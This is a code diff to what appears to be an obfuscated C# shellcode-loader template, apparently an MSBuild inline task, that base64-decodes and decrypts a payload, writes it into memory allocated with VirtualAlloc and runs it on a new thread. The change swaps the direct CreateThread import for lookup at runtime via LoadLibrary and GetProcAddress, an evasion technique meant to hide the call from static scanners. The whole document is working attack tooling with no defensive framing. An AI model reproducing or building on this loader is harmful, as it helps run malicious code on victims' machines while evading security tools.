@@ -43,10 +43,14 @@
 			[DllImport("kernel32")]
 			private static extern UInt32 VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
 			[DllImport("kernel32")]
-			private static extern IntPtr CreateThread(UInt32 VAR15, UInt32 VAR21, UInt32 VAR1, IntPtr VAR3, UInt32 VAR30, ref UInt32 VAR7);
-			[DllImport("kernel32")]
 			private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
-			
+			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+       			private delegate IntPtr VAR32(UInt32 VAR7, UInt32 VAR32, UInt32 VAR1, IntPtr VAR8, UInt32 VAR40, ref UInt32 VAR26);
+			[DllImport("kernel32.dll")]
+        		public static extern IntPtr LoadLibrary(string VAR17);
+       		 	[DllImport("kernel32.dll")]
+        		public static extern IntPtr GetProcAddress(IntPtr VAR5, string VAR26);
+
 			public override bool Execute() {
 				string[] VAR3 = Environment.GetCommandLineArgs();
 			
@@ -58,13 +62,17 @@
 							byte[] VAR9 = {[KEY]};
 							byte[] VAR10 = Convert.FromBase64String(VAR7.ToString());
 							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
+
+							IntPtr VAR33 = LoadLibrary("kernel32.dll");
+                					IntPtr VAR34 = GetProcAddress(VAR33, "CreateThread");
+               						VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 						
 							UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
 							Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
 							IntPtr VAR43 = IntPtr.Zero;
 							IntPtr VAR44 = IntPtr.Zero;
 							UInt32 VAR45 = 0;
-							VAR43 = CreateThread(0, 0, VAR42, VAR44, 0, ref VAR45);
+							VAR43 = VAR35(0, 0, VAR42, VAR44, 0, ref VAR45);
 							WaitForSingleObject(VAR43, 0xFFFFFFFF);
 							return true;
 						}
